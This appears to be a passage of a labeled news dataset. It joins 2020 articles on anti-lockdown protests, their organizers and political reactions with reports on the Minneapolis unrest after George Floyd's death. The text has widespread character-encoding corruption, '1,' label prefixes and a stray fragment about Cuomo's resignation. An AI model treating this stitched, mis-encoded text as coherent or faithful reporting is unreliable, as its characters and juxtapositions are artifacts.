home right now, but I look at this as my civic duty. Is it inconvenient and kind of boring? Yes. But the more we are all in this together and staying home, the faster this will be over."" She also said she was ""infuriated"" by Trump's tweet about Michigan. ""He's fanning the flames and blatantly inciting violence in our state, which is the last thing we need right now,"" Meyer told Newsweek. Several governors have criticized Trump for supporting the demonstrations against social-distancing measures. Maryland Governor Larry Hogan, a Republican, who faced a similar protest in Annapolis on Saturday, told CNN on Sunday that the demonstrators were essentially protesting against guidelines laid out by the White House. ""So then to encourage people to go protest, the plan that you just made recommendations on on Thursday, it just doesn't make any sense,"" Hogan said. ""We're sending completely conflicting messages out to the governors and to the people, as if we should ignore federal policy and federal recommendations."" National polling has shown that the majority of Americans support stay-at-home orders, with most respondents more concerned that the government will move too quickly to reopen the economy than too slowly. A survey released Sunday by NBC News and The Wall Street Journal showed that 58 percent of respondents were concerned that the U.S. would ease stay-at-home guidance too quickly, while only 32 percent said they were concerned the economy wouldn't be reopened quickly enough. A similar poll released last week by Pew Research Center found that 66 percent were concerned that state governments would be too quick to ease their coronavirus restrictions.

In tandem with Donald Trump, Fox News hosts and other influential conservatives spent the weekend egging on a small number of mask-less protesters flouting social distancing guidelines by crowding state capitols and demanding that closure orders be lifted. These â€œGive me liberty and give me death!â€ rallies, as a Washington Post satire piece put it, represent the opinions of a decided minority: A Politicoâ€“Morning Consult poll released last week found that 81% of Americans support maintaining social distancing measures â€œfor as long as is needed to curb the spread of coronavirus, even if it means continued damage to the economy,â€ while nearly 60% of respondents in a similar NBCâ€“Wall Street Journal survey voiced concerns over the U.S. lifting mitigation efforts too soon. But perhaps out of wishful thinking, members of the right-wing media are nonetheless framing protests as the Tea Party movement reincarnated. â€œA lot of people are very proud of you,â€ said Fox News host Jeanine Pirro during a Saturday night interview with Meshawn Maddock, an organizer behind the so-called â€œOperation Gridlockâ€ protest in Lansing, Michigan. â€œPeaceful protests, civil liberties, itâ€™s what weâ€™re all about. Keep going.â€ The segment aired after Pirroâ€™s colleagues had spent days praising the protests. Last week Tucker Carlson hosted Maddock and thanked the Michigan Conservative Coalition activist for her service. On Saturday morning Fox & Friends prominently displayed the locations of future rallies on a map of the countryâ€”exactly what the network did years prior to promote the anti-Obama Tea Party protests. An article published on Foxâ€™s website took the effort a step further, embedding a tweet with contact information for those who wished to join the Wisconsin Freedom Rally. On Friday conservative talk radio giant Rush Limbaugh cheered on the protesters by citing historic examples of American bravery and sacrifice, including U.S. involvement â€œin World War II,â€ adding, â€œThis shutdown, and hunkering down in total fear, is not a hallmark of American history.â€ Moving in lockstep with his media allies, the president has personally incited the protests, writing in three separate tweets on Friday, â€œLIBERATE MINNESOTA,â€ â€œLIBERATE MICHIGAN,â€ and â€œLIBERATE VIRGINIA...save your great 2nd Amendment. It is under siege!â€ Speaking at the White Houseâ€™s coronavirus task force briefing on Sunday, Trump doubled down, calling the protesters â€œa very orderly group of people,â€ despite the fact that some flew Confederate flags and flashed signs with swastikas, and falsely claiming that protesters â€œwere all six feet apart,â€ despite an abundance of photo and video evidence to the contrary. â€œTheir life was taken away from them. They want their life back,â€ he concluded. Responding to a question on the protestersâ€™ use of Nazi symbolism, the president delivered a remark reminiscent of his infamous â€œvery fine people on both sidesâ€ line following a 2017 white nationalist rally: â€œWell that, I totally would say, no way. But I didnâ€™t see that.â€ Trumpâ€™s outspoken support marks the latest flashpoint in the White Houseâ€™s ongoing war with states amid the pandemic. A number of governors aired their opposition to Trumpâ€™s comments throughout Sunday, including Virginia governor Ralph Northam, who asserted that now is â€œnot the time for protests, this is not the time for divisivenessâ€; and Washington governor Jay Inslee, who condemned Trumpâ€™s fostering of â€œillegal activityâ€ and said, â€œIt is dangerous because it can inspire people to ignore things that actually can save their lives.â€ Michigan governor Gretchen Whitmer, the rightâ€™s primary target in their justification of the rallies, did not directly address them, but she did explain why some in Michigan are failing to grok the reasoning behind social distancing policies. â€œThe hard part of public health is when youâ€™re doing a good job, youâ€™re saving lives, and itâ€™s hard to quantify precisely what that looks like,â€ she told CNN. And Maryland governor Larry Hogan noted that it is not â€œhelpful to encourage demonstrations and encourage people to go against the presidentâ€™s own policy.â€¦ You canâ€™t start to reopen under his plan until you have declining numbers for 14 days, which those states and my state do not have.â€ Hoganâ€™s deputy communications director also noted that Mondayâ€™s Reopen Marylandâ€“organized rally in Annapolis saw â€œmore media inquiriesâ€ than actual protesters. Indeed, the gatherings have typically featured attendees in the dozens or low triple figures, making Michiganâ€™s Thursday crowd of roughly 3,000 an outlier. Though the likes of Fox have framed the protests as an organic grassroots push, a good number have been organized through a network of Facebook pages that appear to have been launched by a right-wing activist family known for using pro-gun and anti-abortion social media posts to harvest data, per reports from the Washington Post and NBC News. Aaron, Ben, Chris, and Matthew Dorr are reportedly behind pages that have accumulated more than 200,000 members in total, such as New Yorkers Against Excessive Quarantine and Minnesotans Against Excessive Quarantine. However, given Facebookâ€™s newly announced ban on groups advocating for social distancing violations, itâ€™s unclear how much longer these groups will be allowed to exist on the platform. The family declined requests for comment from NBC News and the Post, but Ben Dorr called accusations of them running a scam operation â€œfake newsâ€ in a response to the Philadelphia Inquirer. In one of the Dorrsâ€™ most successful pushes, over 100,000 Facebook users have joined a Wisconsinites Against Excessive Quarantines group, and at least 300 of those members RSVPâ€™d for an â€œOperation Gridlockâ€ protest next week. (The groupâ€™s creator, Ben Dorr, lives in Iowa, NBC News found.) The scheduled rally is a rip-off of Michiganâ€™s â€œOperation Gridlock,â€ which was staged by a group backed by the billionaire family of Trumpâ€™s education secretary, Betsy DeVos. Trump blamed the governors for instigating the backlash, casting their shutdown policies as extreme, even though many are in accordance with recommendations from the White Houseâ€™s own Dr. Anthony Fauci and the Centers for Disease Control and Prevention. â€œIf people feel that way, youâ€™re allowed to protest. Some governors have gone too far, some of the things that happened are maybe not so appropriate,â€ he told reporters on Sunday. When Chuck Todd pressed Mike Pence about Trumpâ€™s protest cheerleadingâ€”â€œWhy is the president trying to undermine the guidance youâ€™ve been laying out?â€â€”Pence deflected. â€œI donâ€™t accept your premise,â€ he said, â€œand I donâ€™t think most Americans do either.â€ â€” Does the King of the Coronavirus Contrarians Have a Case?â€” In the COVID-19 Crisis, Warren Buffett Is Lying Lowâ€”And Bill Ackman Stepping Upâ€” Can You Beat COVID-19 Without a Lockdown?

1,"WATCH LIVE Protest against Pa. business closures planned in Harrisburg Pennsylvania Secretary of Health Dr. Rachel Levine delivers COVID-19 updates on April 16, 2020."
1,"LIVE Phil Archer, Reporter Published: April 23, 2020 8:01 pm Phil Archer, Reporter HOUSTON â€“ Hundreds of protestors expressed their anger toward Harris County Judge Lina Hidalgoâ€™s order requiring all county residents to wear face masks in public. The large group gathered outside the Harris County Administration Building in downtown Houston Wednesday. The protest, similar to others taking place across the country, highlighted the growing tension between personal liberty and public health in a time of national crisis. About 200 people carrying signs, flags and bull horns gathered on the sidewalk. â€œIâ€™m tired of the government trying to tell us what to do,"" said protestor Marga Matthews. The protest was organized by longtime conservative activist Dr. Steven Hotze and attorney Jared Woodfill, the former chairman of the Harris County Republican Party. They also filed a lawsuit Wednesday seeking to block the order requiring all county residents to wear face masks, to wash their hands, and to not touch their faces for 30 days on pain of a one thousand dollars fine. Their lawsuit contends Judge Hidalgoâ€™s order is unconstitutional and an overreach of her power. â€œThe order that weâ€™re dealing with right now we believe is an unconstitutional, trampling and infringement on our liberties,â€ Woodfill said. â€œThis is one individual who is dictating from her office over there on Preston as to what we can or canâ€™t do.â€ In opposition, the county attorney says the Texas Constitution gives the judge broad power during an emergency to implement public health measures such as quarantine and the wearing of face masks. â€œThereâ€™s no constitutional right not to wash your hands; no constitutional right during a pandemic to be allowed to spread a deadly virus to other people,"" Assistant Harris County Attorney Seth Hopkins said. â€œItâ€™s reasonable, during this transition phase, to ask people to cover their mouths. Similar laws were declared constitutional during the 1918 pandemic. They were constitutional then, theyâ€™re constitutional today.â€ The judgeâ€™s order follows recommendations from the national Centers for Disease Control and Prevention already being followed in Dallas and Bexar counties. Other Texas counties, like Galveston and Montgomery counties are opposing the measure on constitutional grounds. But medical experts like Dr. Joseph Varon who treat virus victims at the United Memorial Medical Center in north Houston say requiring face masks makes sense. â€œSome of my own friends are not happy with this idea.â€ Dr. Varon said. â€œThis is a measure that may prevent more spreading of the COVID. As it is right now, weâ€™re still in a crisis, weâ€™re still not over this hump. And this will prevent more cases."" Copyright 2020 by KPRC Click2Houston - All rights reserved.

1,"Protest planned Sunday in Olympia, Washington RICHLAND, Wash. -- Protesters in boats and on shore Saturday demanded that restrictions on recreational fishing and shellfish harvesting in Washington because of the coronavirus be lifted.About 50 boats along with several hundred protesters on shore gathered on Saturday around Columbia Point Marina in Richland in southeastern Washington. The state Department of Fish and Wildlife on March 25 temporarily closed recreational fishing and shellfish harvesting to prevent the spread of the coronavirus.But the protesters say the restrictions should be lifted because anglers can practice social distancing while fishing. They said kayakers, jet skis, wake boarders, pleasure boaters and others are on the water.â€œThereâ€™s nobody but us two out in the middle of the river,â€ Alan Doughty told the Tri-City Herald. He was on their boat in the Columbia River with Pam Doughty and their two dogs. ""Weâ€™ve got a $60,000 boat. We have I donâ€™t know how much in gear. Weâ€™ve got a fishing license. Weâ€™ve got insurance, and we canâ€™t use it,â€Ben Hanes organized the protest after noticing non-fishing boaters on the water and believed the restrictions on fishing were unfair.â€œThe anglers of Washington state arenâ€™t going to put up with (the ban) much longer,â€ he said.Al Bernicker, 74, regularly comes to Columbia Point to fish. This time he brought a sign that said, â€œI can sit here. Why not fish here. I am 6-feet apart.â€ Advertisement Washington has at least 11,735 virus cases and 611 deaths, according to a Johns Hopkins University tally on Saturday afternoon.For most people, the coronavirus causes mild or moderate symptoms, such as fever and cough, that clear up in two to three weeks. But it can cause more severe illness, including pneumonia, and death for some people, especially older adults and people with pre-existing health problems.

Angry demonstrators took to the streets in North Carolina and Missouri on Tuesday to voice their discontent at their statesâ€™ stay-at-home orders amid the coronavirus pandemic. The protests in Raleigh, N.C. and Jefferson City, Mo., are the latest in a series of protests across the country against state lockdown orders â€“ fueled by tweets of support from President Trump and the economic unease caused by the coronavirus. Holding handmade signs with slogans like â€œMy Rights Are Essentialâ€ and â€œReOpenNC,â€ hundreds of people marched through downtown Raleigh while chanting â€œFreedom Now.â€ Most of the people at the protest were not wearing masks and were ignoring orders to maintain social distancing practices. Similar signs along with a slew of American flags were seen as people began to gather outside the Missouri Capitol building, although the protestors seemed to be trying to maintain better social distancing than in North Carolina. Protests against the lockdown orders have cropped up in numerous states over the past few weeks as some Americans have become frustrated with being told to stay at home and with the economic freefall the virus has caused. The federal government said Thursday that 5.2 million more Americans applied for unemployment benefits last week, bringing the four-week total to about 22 million out of a work force of 159 million â€” easily the worst stretch of U.S. job losses on record. The losses translate to about one in seven workers. Last week, hundreds of cars, trucks and SUVs descended on Michiganâ€™s state capital Wednesday afternoon as part of a noisy protest against Democratic Gov. Gretchen Whitmerâ€™s social-distancing restrictions that critics say have gone too far. The same day, a number of people gathered outside the Kentucky Capitol building to protest Gov. Andy Beshearâ€™s shutdown orders, while more gathered in Virginia to protest on Thursday. CLICK HERE FOR COMPLETE CORONAVIRUS COVERAGE Several hundred people rallied in Texas' capital over the weekend, chanting â€œLet us work!â€ Many clamored for an immediate lifting of restrictions in a state where more than 1 million have filed for unemployment since the crisis began. The rally was organized by a host of Infowars, owned by conspiracy theorist Alex Jones, who joined protesters on the Capitol steps. Jones is being sued in Austin over using his show to promote falsehoods that the 2012 Sandy Hook school massacre in Connecticut was a hoax. In Indianapolis, more than 200 people stood close together outside the governor's mansion, carrying American flags and signs demanding that Gov. Holcomb lift restrictions. Indiana's state health department reported 529 new cases between April 7 and midday Friday, raising the total to more than 10,600. The number of deaths rose by 26, to 545. Elsewhere, a few hundred demonstrators waved signs outside the Statehouse in New Hampshire, which has had nearly 1,300 cases of the virus and more than three dozen deaths. More protests this week are planned in New York, Pennsylvania, Maryland and Wisconsin. TRUMP â€˜FOMENTING DOMESTIC REBELLION,â€™ DEM GOVERNOR INSLEE SAYS While many governors have pleaded with their constituents to not protest during the public health crisis as it may only cause more people to get sick, the demonstrations â€“ mainly organized by conservative groups â€“ have found an ally in the president. â€œLIBERATE MINNESOTA!â€ â€œLIBERATE MICHIGAN!â€ â€œLIBERATE VIRGINIA,â€ Trump said in a tweet-storm in over the weekend in which he also lashed out at New York Gov. Andrew Cuomo, a Democrat, for criticizing the federal response. Four states â€“ Florida, Georgia, South Carolina and Texas â€“ already have lifted some restrictions or plan to this week. Florida Gov. Ron DeSantis, a Republican, gave the green light for some outdoor areas in the state to reopen late last week even as he cautioned that social distancing guidelines should remain in place. Florida has been one of the stateâ€™s hardest hit by the contagion, with almost 26,000 confirmed cases of COVID-19 and 764 deaths. The state was one of the last in the nation to order a lockdown and was heavily criticized for leaving beaches open during part of the spring break period last month. But by late Friday afternoon, thousands of people flooded the beaches in places like Jacksonville after they reopened despite pleas from mayors to practice safe social distancing measures. In nearby South Carolina, Republican Gov. Henry McMaster is set to announce on Monday the reopening of state beaches and some retail stores. McMaster already reinstated last Friday access to public boat ramps and landings. CLICK HERE FOR THE FOX NEWS APP Texas Gov. Greg Abbott announced over the weekend that state parks will reopen for recreational activity on Monday, so long as citizens wear masks and maintain a distance of six feet from each other. Subsequent measures will allow hospitals to resume elective tests and surgeries while stores can start â€œretail to goâ€ services, starting on Wednesday and Friday, respectively. Despite the protests and opening up of some states, many lawmakers and public health officials warn that the country is far from safe when it comes to dealing with the virus. The Center for Systems Science and Engineering (CSSE) at Johns Hopkins University has recorded more than 788,000 confirmed cases of COVID-19 in the U.S., while the Centers for Disease Control and Prevention have reported that over 39,000 people in the country have died for the disease. Public Health officials have said the ability to test enough people and trace contacts of the infected is crucial before easing restrictions, and that infections could surge anew unless people continue to take precautions.

1,"Many of the right-wing protests against state stay-at-home orders sweeping the nation have been organized or attended by white nationalists, conspiracy theorists, anti-government militias, members of a neo-fascist street gang, and other assorted extremists and scam artists, a HuffPost analysis shows. The protests, largely coordinated on Facebook, have seen crowds of hundreds descend upon state and city government buildings, where participants flagrantly flout social distancing guidelines to demand that their respective governors reopen state businesses during a deadly pandemic. Images of these often heavily armed protesters, screaming at health care workers and blocking ambulances from reaching hospitals, have gone viral, shocking a country where polls show a large majority support measures to slow the spread of COVID-19, which has already killed over 45,000 people in this country. Yet the events â€” which present a clear danger to communities across the U.S., risking the further spread of a virus â€” have been promoted extensively by Fox News. On Friday, immediately after a Fox segment sympathetic to the rallies, the president tweeted out his support for the protesters. â€œLIBERATE MINNESOTA!â€ â€œLIBERATE MICHIGAN!â€ â€œLIBERATE VIRGINIA,â€ Trump wrote in a tweet-storm, directly contradicting the advice of the medical experts on his own COVID-19 task force. Itâ€™s easy to see why footage of the protests might excite the president. They bear a striking resemblance, after all, to his own fascist campaign rallies, with attendees who are almost uniformly white, and who display a deep devotion to the president, donning red MAGA hats and waving Trump 2020 flags. And like Trumpâ€™s rallies, the anti-shutdown protests are teeming with right-wing extremists. Hereâ€™s a brief look at some of the figures who have either organized or attended these events over the last week. A rally Monday in Augusta, the state capital of Maine, was organized in part by Larry Lockman, a white nationalist former state lawmaker who in 2017 warned that proposed immigrant welcome centers were tantamount to a â€œwar on whites.â€ According to Maine-based journalist Nathan Bernard, Lockman helped coordinate Mondayâ€™s anti-shutdown event on the â€œMainers Against Excessive Quarantineâ€ Facebook page, where he encouraged attendees to show up to the rally wearing MAGA gear. â€œThis is about the loss of our civil rights and its impact on our businesses and religion,â€ he wrote in one post. Bernard reported seeing Lockman coordinating a group of unmasked protesters at the rally Monday. In Columbus, Ohio, two men were photographed at an anti-shutdown protest holding up an anti-Semitic sign depicting Jews as rats, calling them â€œthe real plague.â€ The Anti-Defamation Leagueâ€™s Center on Extremism believes one of the men belongs to the neo-Nazi National Socialist Movement. According to the ADL, this individual was photographed at a 2019 white power rally with Timothy Wilson, who was killed by federal agents last month during an attempted arrest over his alleged plot to bomb a Missouri hospital during the pandemic in order to attract attention to his white supremacist views. A â€œReopen Floridaâ€ protest scheduled for this weekend in Miami was organized by a leader of the neo-fascist street gang The Proud Boys, the Miami New Times reported this week. Enrique Tarrio, a longtime Proud Boy, admitted to the New Times that heâ€™d organized the rally, which heâ€™s advertised as being â€œagainst the Democrat-driven unconstitutional lockdown.â€ Members of the Proud Boys â€” a Southern Poverty Law Center-designated hate group originally founded by bigot Gavin McInnes â€” have deep ties to a host of white nationalist and militia groups, and are best known for violently attacking their political opponents. Proud Boys have also been spotted at anti-shutdown protests in Colorado, Nevada, Ohio and Michigan. At the rally in Lansing, Michigan, Proud Boys were allegedly among the attendees blocking ambulances from being able to reach a hospital. Also in Michigan â€” as noted by reporter Jason Wilson in The Guardian â€” were members of the Michigan Liberty Militia, whose Facebook page Wilson notes â€œfeatures pictures of firearms, warnings of civil war, celebrations of Norse paganism and memes ultimately sourced from white nationalist groups like Patriot Front.â€ An April 19 rally in Olympia, Washington, was well-attended by other anti-government militia groups, including the Oathkeepers and Three Percenters, whose members have been implicated in multiple anti-Muslim terror plots in recent years. Matt Marshall, leader of a state chapter of the Three Percenters, encouraged attendees ahead of the Olympia rally to wear Hawaiian shirts, a reference to the â€œBig Luau,â€ which is itself code for the â€œboogaloo,â€ a term used in white supremacist, militia and far-right circles to describe the bloody civil war they predict â€” and often hope â€” is coming to America. According to the ADL, anti-shutdown protesters in Tennessee and New Hampshire have been spotted holding up signs invoking the boogaloo. â€œLiberty or Boogaloo,â€ the signs have said, and â€œJoin my boog squad.â€ In San Diego, an anti-shutdown protest this past Saturday was organized by Roger Ogden, who has previously held a series of far-right rallies in the city in coordination with the Proud Boys and the Three Percenters. â€œWe do not believe that the COVID-19 bug represents such an immediate danger to others that constitutional rights should be curtailed,â€ Ogden told reporters at the San Diego rally, downplaying the virus as less severe than the flu. (COVID-19 is thought to be 10 times more deadly than the flu.) And in Idaho, rally scheduled for this Friday outside the state capital building in Boise is being advertised by Diego Rodriguez, a pastor and former Republican candidate for the state senate. Rodriguez recently held an Easter Sunday church service â€” in defiance of social distancing orders in the state â€” with Ammon Bundy, who led the militia occupation of the Malheur National Wildlife Refuge in 2016. Anti-vaccination extremists, a mainstay of Trump rallies and other far-right events in recent years, have been seen at multiple anti-shutdown protests. An April 14 rally in Raleigh, North Carolina, was organized in part by an anti-vaccination activist named Ashley Smith. â€œI am against mandatory vaccination,â€ Smith said in an email to The News & Observer. â€œThat is a personal right and as a sovereign citizen I have the right to choose what medical procedures I and my children receive. Pandemic status/state of emergency doesnâ€™t change that.â€ Public health experts fear the anti-vaxx movement could, once a COVID-19 vaccine is developed, undermine a national inoculation program.

Owen Shroyer, a host on the conspiracy website Infowars, held a â€œYou Canâ€™t Close Americaâ€ rally in the Texas state capitol last weekend, attracting hundreds of attendees. When Infowars founder Alex Jones arrived with a bullhorn, fans swarmed around him and jostled to shake his hand as Jones declared that the pandemic â€” which has already killed over 500 people in Texas â€” is a hoax. Investigations by The Washington Post and NBC News revealed that some of the largest Facebook groups organizing protests across the country were all founded by four brothers with a history exploiting far-right causes to rake in hundreds of thousands of dollars. The Dorr brothers â€” Chris, Ben, Aaron and Matthew â€” were the founders or administrators of the groups New Yorkers Against Excessive Quarantine, Minnesotans Against Excessive Quarantine, Ohioans Against Excessive Quarantine, Pennsylvanians Against Excessive Quarantine and Wisconsinites Against Excessive Quarantine. According to NBC News, the groups started or administered by the brothers, which have amassed some 200,000 members, direct people to websites owned by the Dorrs, which then directs people to register their names and addresses, or to sign up as dues-paying members for organizations promoting pro-gun, anti-abortion, or pro-Trump causes. But Republicans who have previously crossed paths with the Dorr brothers warn that such fundraisers have little to do with political organizing and more to do with lining the Dorrsâ€™ pockets. Minnesotaâ€™s Senate Republican Caucus earlier this year warned voters about these Dorr â€œscams.â€ And Minnesota Citizens Concerned For Life, a prominent anti-abortion group, states on its website that the â€œDorr brothers are established scam artists.â€ â€œNothing they say can be believed,â€ the website says, â€œand giving them your money will not advance the pro-life cause in any way.â€ A HuffPost Guide To Coronavirus Stay up to date with our live blog as we cover the COVID-19 pandemic What happens if we end social distancing too soon?

At a press conference on Tuesday, Mr Cuomo continued to deny many of the accusations of unwanted physical contact with women, before explaining that the situation had consumed the stateâ€™s attention while officials battled a resurgence of Covid-19. The stateâ€™s attorney general, Letitia James, previously released a report finding that sexual harassment accusations against the governor from nearly a dozen women were credible. Gov. Andrew Cuomo announced his resignation Tuesday over a barrage of sexual harassment allegations in a fall from grace a year after he was widely hailed nationally for his detailed daily briefings and leadership during the pandemic's peak. â€œThe best way I can help now is if I step aside and let government get back to government,â€ Cuomo said.

1,"Echoes Screenshot/Twitter/The King Center Rioting and looting isn't new in America â€” and it isn't exclusive to any race. As areas of Minneapolis shifted from peaceful protest against the death of George Floyd to looting, arson, and vandalism on Wednesday and Thursday night, the King Center â€” founded by Martin Luther King Jr.'s widow to promote MLK Jr.'s ""nonviolent philosophy and methodology"" â€” posted this excerpt from King's 1967 ""The Other America"" speech at Stanford University. Speaking two years after California's Watts riots in August 1965 and race riots in Harlem the previous summer, King spent a few minutes trying to explain the cause of rioting to his predominantly white audience. â€œIn the final analysis, a riot is the language of the unheard. And what is it that America has failed to hear?â€ pic.twitter.com/Als3jhxaGH America has consistently ""taken a positive step forward on the question of racial justice and racial equality"" only to follow it with ""certain backward steps,"" King said. Because of widespread and widely ignored black poverty and racial injustice, ""all of our cities are potentially powder kegs,"" he added, and ""many in moments of anger, many in moments of deep bitterness engage in riots."" King continued: Let me say as I've always said, and I will always continue to say, that riots are socially destructive and self-defeating. ... But in the final analysis, a riot is the language of the unheard. And what is it that America has failed to hear? It has failed to hear that the plight of the Negro poor has worsened over the last few years. It has failed to hear that the promises of freedom and justice have not been met. And it has failed to hear that large segments of white society are more concerned about tranquility and the status quo than about justice, equality, and humanity. And so in a real sense our nation's summers of riots are caused by our nation's winters of delay. And as long as America postpones justice, we stand in the position of having these recurrences of violence and riots over and over again.

But we cannot give this man back to his family.â€ By Molly Hensley-Clancy Last updated on May 29, 2020, at 3:57 p.m. ET Posted on May 29, 2020, at 2:52 p.m. ET The ashes of the Gandhi Mahal restaurant are seen behind police in South Minneapolis on Friday morning. The first thing Hafsa Islam felt Friday morning, when she woke up in a neighborhood filled with acrid smoke, was anger. The restaurant in South Minneapolis that had been her familyâ€™s lifeâ€™s work, Gandhi Mahal, had burned down in protests early Friday morning, days after George Floyd, a black man, died after a white police officer used a knee chokehold on him. Then Hafsa heard her father, Ruhel Islam, on the phone. â€œLet the buildings burn,â€ he was saying. â€œJustice needs to be served. Put those officers in jail.â€ Hearing her fatherâ€™s words on the phone calmed Hafsa, who said she has always supported the Black Lives Matter movement. â€œIt helped me realize what we were there for,â€ she said. â€œIt has gotten to a point where this is the only way that we can get justice, and we can change the system.â€ Hafsa, 18, posted what her father had said on Gandhi Mahalâ€™s Facebook page, hoping to help others understand why there were more important things at stake in the protests than buildings, she said. She was met with an outpouring of support from the community and promises to help the restaurant rebuild. Ruhel, an immigrant from Bangladesh, explained it this way: â€œLife is more valuable than anything else,â€ he said, hours after his restaurant had burned. â€œWe can rebuild a building. But we cannot give this man back to his family.â€ News Oâ€™Clock is your daily look at whatâ€™s going on out there in the world beyond your quranteam. Catch up on all the episodes or subscribe on Apple Podcasts, the iHeart Radio app, Spotify, Google Podcasts, or wherever you listen to your favorite shows. In the wake of Floydâ€™s death, Hafsa had spent the past few days at Gandhi Mahal, which sits just a few blocks from the Minneapolis Policeâ€™s Third Precinct, in the heart of the neighborhood that has been the epicenter of the protests. She had seen medics carrying people injured in the protests. Sheâ€™d seen nonviolent protesters stung by tear gas and rubber bullets. And she had even, she said, caught a glimpse of George Floyd as he was arrested a few blocks away. She was in her car, running DoorDash orders from her familyâ€™s restaurant. She even filmed a 5-second video on Snapchat, a blurry video showing police with a man on the corner where Floyd was arrested. â€œThe first thing I noticed was his facial expression,â€ Hafsa said. â€œIt brought that image to my mind. I remembered how he was crying and in pain.â€ She has thought of that expression, she said, as she watches the protests unfold in her city. â€œI think the people saying that people should stop protesting are wrong,â€ she said. The boarded up storefront of Moon Palace books, which was tagged with ""Do Not Burn."" As the protests and violence that erupted over Floydâ€™s death have reduced much of the south Minneapolis neighborhood where Floyd was arrested to rubble, many have used the plight of small business owners as a cudgel against the protesters. To Ruhel, who grew up in a â€œpolice stateâ€ in Bangladesh, the forces that brought down his beloved restaurant were very clear. He places the blame on city leaders and local law enforcement who had failed to arrest the officers involved in Floydâ€™s death, before the officer who knelt on Floydâ€™s neck was charged with murder Friday afternoon. The other three officers have not been charged. â€œThey could have stopped this,â€ Ruhel said. â€œThey need to put the police in jail. It should have been solved two, three days ago.â€ Other small business owners in Minneapolis have gone out of their way to support the protests, even with their buildings at risk as tensions continue to rise. The owners of Moon Palace, a local bookstore, condemned â€œindifference, violence, and more terrorizing by the policeâ€ in response to Floydâ€™s death. â€œWe so appreciate all of the support weâ€™ve been offered over the past two days, but we urge you: do not put yourself at risk to protect our store,â€ they wrote on Facebook. â€œThe things that may be lost in our building are just things, but your life is priceless, just like George Floydâ€™s life was priceless.â€ Moon Palace's large glass windows were boarded up and tagged with ""Do Not Burn"" after reports emerged that the owners had refused to allow police to stage operations in their parking lot. Hafsa Islam and Ruhel Islam, in their garden. None of this, though, has lessened the pain of the loss of Gandhi Mahal, for Ruhel or for Hafsa. Ruhel tried to protect his building, he said: He stayed there this morning until 1 a.m., when he finally had no choice but to go home. â€œMy heart is very broken,â€ he said of the damage done to his restaurant. â€œWe want justice for our brother, but we donâ€™t want to be destroyed. I see young people's anger. At the end, we believe in peace.â€ On Friday, Ruhel tried to examine the damage done to their restaurant. But police were blocking off the streets, he said, and he couldnâ€™t get through. Around him, rubble still smoked. Instead, Ruhel and Hafsa went to the garden that they started nearby, called the Interfaith Garden, where Ruhel has long worked with other community groups to grow fresh vegetables and spices that are served at Gandhi Mahal. Ruhel tended to cilantro, beans, and fenugreek, a medicinal spice. Around them, the smoke was still so heavy that their throats burned. â€œIâ€™m going to plant in the garden and pray for everyone,â€ Ruhel said. He has told Hafsa not to worry about the loss of their restaurant, which was their main source of income. â€œWeâ€™ll figure it out, donâ€™t worry, weâ€™ll work together,â€ he said he told her. â€œWeâ€™re growing a lot of food, vegetables, and Iâ€™m not worried. Iâ€™m going to start planting and growing and growing to survive.â€ Contact Molly Hensley-Clancy at molly.hensley-clancy@buzzfeed.com. Got a confidential tip? Submit it here.

1," KSTP Updated: May 28, 2020 09:54 AM Created: May 27, 2020 07:49 PM Protests continued into Wednesday night in south Minneapolis, where Chopper 5 captured video of apparent looting at a nearby Target and other area businesses. Fires have sprung up around the area as well. Gov. Tim Walz tweeted late Wednesday night, calling the situation near Lake Street and Hiawatha Avenue an ""extremely dangerous situation."" The situation near Lake Street and Hiawatha in Minneapolis has evolved into an extremely dangerous situation. For everyone's safety, please leave the area and allow firefighters and paramedics to get to the scene. The protests are happening in response to the death of George Floyd, who was killed Monday night after an incident that involved Minneapolis Police officers. All four officers involved in the arrest were fired on Tuesday. Protesters were seen on Chopper 5 footage throwing bottles and rocks at law enforcement, while officers responded with rubber bullets, flash bombs and tear gas to push them back. Some looters at the East Lake Street Target location were seen walking out with televisions, rugs and other items from the store. Other looters were seen at a tobacco store, a Dollar Tree and a liquor store. Additionally, Cub Foods and an AutoZone is being looted as well. The AutoZone was set on fire as of 9:30 p.m. It could be seen burning on Chopper 5 video. A source has confirmed to KSTP that the city requested support from the National Guard late Wednesday night to combat the ongoing violent protests. A Target spokesperson made the following statement: ""We are heartbroken by the death of George Floyd and the pain it is causing our community. We decided to close our Lake Street store earlier today and worked to ensure all of our team members were accounted for and safe. Our focus will remain on our team membersâ€™ safety and helping our community heal. Until further notice, our store will remain closed."" KSTP has a crew on scene to gather more information. The Minneapolis Police Department said they are aware of what is happening in the area and are working on the matter. They advise all to stay out of the area for the time being. Minnesota Sen. Tina Smith shared her thoughts on the night's protests. Iâ€™m praying for peace and healing tonight in Minneapolis, as I hear sirens and explosions across our green city. Our community is in so much pain. Dr. King said, â€œI can only close the gap in broken community by meeting hate with love.â€ Metro Transit has announced that Routes 5 and 23 are being detoured around the area. Walz also posted a series of tweets earlier Wednesday night calling on people to be peaceful if they choose to protest. If you plan to turn your pain into action by joining a public demonstration, please do so peacefully and safely to protect your own health and the health of the people around you. Thatâ€™s why Iâ€™m pushing for a full, fair, and expeditious investigation that will bring us closer to justice. We must continue to examine and address the systemic inequities and discrimination that led to this incident and far too many that have come before. Minneapolis Mayor Jacob Frey tweeted a statement urging others to keep the peace. Please, Minneapolis, we cannot let tragedy beget more tragedy. The area along Lake has become unsafe. We are asking for your help in keeping the peace tonight. https://t.co/kRZuWGJY29 Minneapolis Senators Jeff Hayden and Patricia Torres Ray also made a joint statement on Thursday saying: ""We, along with our constituents, are deeply heartbroken and outraged by the injustice that occurred in the officer-involved death of George Floyd. As our community continues to grieve and grapple with this incredibly unjustifiable loss of life, we believe in their right to peacefully protest. We have grown increasingly concerned, for the safety of the City of Minneapolis and its residents, as the demonstration has escalated. More than ever, our community must come together during this hard time and in this work to fiercely advocate for the justice that is needed. We are eager to effectively partner with community organizers, leaders, activists, and advocates to prevent the loss of another life due to excessive use of force.""  This is a developing story.

